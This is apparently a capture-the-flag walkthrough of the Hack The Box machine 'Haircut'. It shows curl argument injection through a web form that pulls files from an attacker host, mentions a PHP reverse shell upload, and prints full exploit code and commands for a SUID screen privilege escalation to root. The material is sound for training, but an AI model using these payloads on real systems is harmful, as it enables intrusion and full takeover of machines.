# HTB - Haircut

![](../.gitbook/assets/image%20%282%29.png)

In this walkthrough we'll examine 'Haircut' from Hack The Box. This machine provides a number of useful lessons and I highly recommend working through this machine in preparation for the OSCP examination.

#### **Scanning** and enumeration

As usual, begin by scanning the machine to identify open ports.  My ‘go to’ scan is `nmap -p- -A $ipaddress`. The scan reveals that two ports are open:  SSH on port 22 and an nginx webserver operating on port 80.

![](https://oncyberwar.com/wp-content/uploads/2021/01/image-1.png)

Enumerating this box is fairly straight forward with only two open ports.

First, we briefly look at SSH. The SSH server does not permit anonymous logins and the version does not have any major vulnerabilities that may help us gain access.

Next, we turn our attention to the web server on port 80. Visiting the website in our browser takes us to a page containing an image.  The source of the page does not provide any interesting information.

![](https://oncyberwar.com/wp-content/uploads/2021/01/image-3.png)

Scanning with Nikto reveals that the Nginx server is outdated; however, a quick Google search does not yield any vulnerabilities for the installed version.  Interestingly, Nikto also indicates the existence of a ‘/test.html’ directory, which contains another seemingly dead end \(for now\).

![](https://oncyberwar.com/wp-content/uploads/2021/01/image-4.png)

Next, we turn our attention to fuzzing for additional directories on the web server.  Our initial Dirsearch scan locates the ‘/test.html’ directory and a redirect for an /uploads directory.  Navigating to /uploads/ we receive a 403 error.

![](https://oncyberwar.com/wp-content/uploads/2021/01/image-5.png)

\*\*This is where this machine provides a valuable lesson for new and developing pentesters. Our enumeration to this point hasn’t provided any other clues, so we really only have two options: go back to see if we’ve missed anything, or use more intensive directory scans. \*\*

After a quick review of the Nmap scan, I opt to continue more extensive fuzzing for hidden directories. I altered the original scan parameters to use the 'directory-list-2.3-medium.txt' wordlist, but receive even fewer results. \(This wordlist is included with Kali and can be found at /usr/share/wordlists/dirbuster/\) .

![](https://oncyberwar.com/wp-content/uploads/2021/01/image-7.png)

Finally, I modified the scan again, this time using the -f option, which forces the specified extensions be appended to every entry in the word list. I was previously unfamiliar with this option; however, in this instance it paid off. and the scan identifies the presence of "/exposed.php".

![](https://oncyberwar.com/wp-content/uploads/2021/01/image-8.png)

Navigating to the page we find a web form that allows user input. Selecting 'Go' without modifying the input field results in the display of the image we previously located at test.html. This suggests command execution is occurring. Time to examine this function using a web proxy interceptor.

![](https://oncyberwar.com/wp-content/uploads/2021/01/image-9.png)

After loading and configuring Burp Suite we execute and intercept the command. Analysis of the results reveals that the command is generating a POST message that is sent to the webserver to retrieve 'test.html.'

![](https://oncyberwar.com/wp-content/uploads/2021/01/image-10.png)

We can now use Burp Suite's repeater to modify the POST request and attempt to change the behavior of the web server. I first attempted to pass the 'id' command before the URL, but 'test.html' still loads. Next, I attempt with '&id', and receive an error from the server. In the response message we see that curl is being used to transmit the request to the web server.

![](https://oncyberwar.com/wp-content/uploads/2021/01/image-11.png)

Following the suggestion of the text in the error message, I modify the formurl field in Repeater, replacing '&id' with '--help.' The response from the server includes the curl help menu \(command execution\).

![](https://oncyberwar.com/wp-content/uploads/2021/01/image-12.png)

#### Establishing a foothold

Now that we understand how the command works, we can attempt to upload files to the server using curl. Our previous enumeration identified the existence of an ‘/uploads’ directory, which we can target as our upload destination.  Nmap also identified that this is a Linux box, so we’ll first attempt to upload an image to the server—then test to determine if the upload was successful.

To upload files we first create a SimpleHTTPServer on the attacking machine, then use Burp Suite to attempt to retrieve the file by modifying the POST command.  We can also specify within the POST command to attempt to save the file in the location where we suspect the 'uploads' directory resides: ' /var/www/html/uploads/.'

```text
Formurl = http://10.10.14.18/cat.jpg -o /var/www/uploads/cat.jpg
```

The web server response does not include an error, but we can confirm the upload was successful by navigating to 'uploads/cat.jpg.'

![](https://oncyberwar.com/wp-content/uploads/2021/01/image-13.png)

Next, we can upload attempt to upload a reverse shell.  Since we know that the server is already using PHP, we’ll first attempt a PHP reverse shell.  I modify a basic PHP reverse shell with the IP address of my attacking machine and upload it using Burp Suite.  I then set up a netcat listener and navigate to the newly uploaded shell via the browser.  Success!

The user flag is located at /home/maria/Desktop

![](https://oncyberwar.com/wp-content/uploads/2021/01/image-14.png)

#### Privilege escalation

Before escalating our privileges we need to upgrade to an interactive shell. Enumeration reveals that this machine includes Python3, but not Python2. Therefore we spawn a TTY shell using:

```text
Python3 “import pty; pty.spawn(‘/bin/bash’)”
```

We then background using `Ctrl + Z`, enter the command `stty raw -echo`, and foreground our shell using `fg`. We now have an interactive TTY shell with tab autocompletion.

Next we move on to some basic enumeration to identify privilege escalation possibilities. My methodology typically includes reviewing user and system information, checking for installed binaries, and checking SUID files. If nothing stands out I move on to uploading scripts such as LinPeas.sh to assist with further enumeration. On this machine; however, the basic enumeration was sufficient and we identify an interesting binary with the SUID bit set.![](https://oncyberwar.com/wp-content/uploads/2021/01/image-15.png)

A Google search reveals an exploit is available for this version.  [https://www.exploit-db.com/exploits/41154](https://www.exploit-db.com/exploits/41154)

This exploit includes a bash script, so we can easily download the file, to our attacking machine, make any necessary modification\(s\), and upload to our target.  However, our first attempt at running the exploit fails to compile the embedded C binaries because of missing dependencies.  The easiest method for resolving this issue is to remove the code for the creation of the two binaries, and instead creating/compiling them on your attacking machine and transferring them to the target. 

From the original script the code below and save it to our attacking machine as libhax.c. 

```text
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

Compile the binary using the suggested command.

```text
gcc -fPIC -shared -ldl -o libhax.so libhax.c
```

For the second script we extract the code below, saving it on our attacking machine as rootshell.c.

```text
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

Finally, we compile the second script using the included command.

```text
gcc -o rootshell rootshell.c
```

Next, we transfer both binaries to the /tmp directory on the target machine using wget.![](https://oncyberwar.com/wp-content/uploads/2021/01/image-16.png)

Finally, we execute the remaining commands from the exploit script \(one at a time\).

```text
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
```

Success!![](https://oncyberwar.com/wp-content/uploads/2021/01/image-17.png)

The root flag is located in the /root directory.
